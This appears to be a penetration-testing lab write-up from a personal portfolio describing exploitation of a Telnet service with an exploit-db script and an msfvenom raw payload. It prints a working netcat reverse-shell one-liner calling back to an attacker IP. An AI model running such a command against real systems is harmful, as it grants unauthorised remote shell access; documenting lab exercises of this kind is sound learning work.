Penetration Testing Project 2

Project Title: Exploting Telnet with RAW payload.
Objective: Assess the security posture of a network to identify and address potential vulnerabilities.

Scope: The assessment covered internal network infrastructure, TCP/IP and access controls. This involved testing Telnet vulnerabilities and potential attack vectors that could be exploited by an attacker.

Tools and Techniques:

Nmap: Used for network discovery and identifying open ports and services.
Metasploit(msfvenom): Utilized for exploiting discovered vulnerabilities and validating their impact.

On the internet you can find how to exploit telnet connection easly, but all source showing the same method again and again.

There is an other way to exploit telnet connection, as You can see on exploit-db, there is a script to exploit it, so I copied it to Nano editor, and saved it as a python file.

![Screenshot 2023-11-27 224057](https://github.com/messor89/Portfolio/assets/52599741/da9991c7-aed5-4e54-b084-33b8fa963731)
![Screenshot 2023-11-27 224138](https://github.com/messor89/Portfolio/assets/52599741/43cf5913-0c04-490e-be07-69469acba31f)

After run the python file againts the target machine, the script exploited the telnet connection, and we have access. However it seems, commands are not working.

So I set up a tcpdump listener, and sent a ping request to the attacker machine to see sytem commands are working.

![Screenshot 2023-11-27 223954](https://github.com/messor89/Portfolio/assets/52599741/fb9df158-7fbb-4102-9f49-7a0607776ef5)

As we can see, I recieved the ping request.

![Screenshot 2023-11-27 224030](https://github.com/messor89/Portfolio/assets/52599741/3e56fe53-9cf1-4bd5-af39-0c2240c296f4)


So after this, in msfvenom I generated a payload in RAW format, so I will be able to execute on the target machine. 

mkfifo /tmp/essdef; nc 192.168.30.135 4444 0</tmp/essdef | /bin/sh >/tmp/essdef 2>&1; rm /tmp/essdef

![Screenshot 2023-11-27 224313](https://github.com/messor89/Portfolio/assets/52599741/af8cd16d-615f-47cd-999b-c775403fff3d)

I executed the msfvenom payload on the target machine and started a netcat listener on  the attacker machine, so hopefully we will have a reverse shell.

![Screenshot 2023-11-27 224506](https://github.com/messor89/Portfolio/assets/52599741/27d3a26f-a8ef-455a-b61f-e4b55e0e0b6a)

And the result is........


![Screenshot 2023-11-27 224528](https://github.com/messor89/Portfolio/assets/52599741/b10b5f53-e808-4a47-aa00-34cd02f8a6b1)

Key Findings:

Critical Vulnerabilities: Discovered several critical vulnerabilities, including open ports.

Recommendations: Close the ports what are not in use, and make sure they are secure.













We did it, and now we have full access to the target machine, and all commands are working. This was the "more" difficult way as probably everybodu would suggest to just go with metasploitable framework and execute a payload.
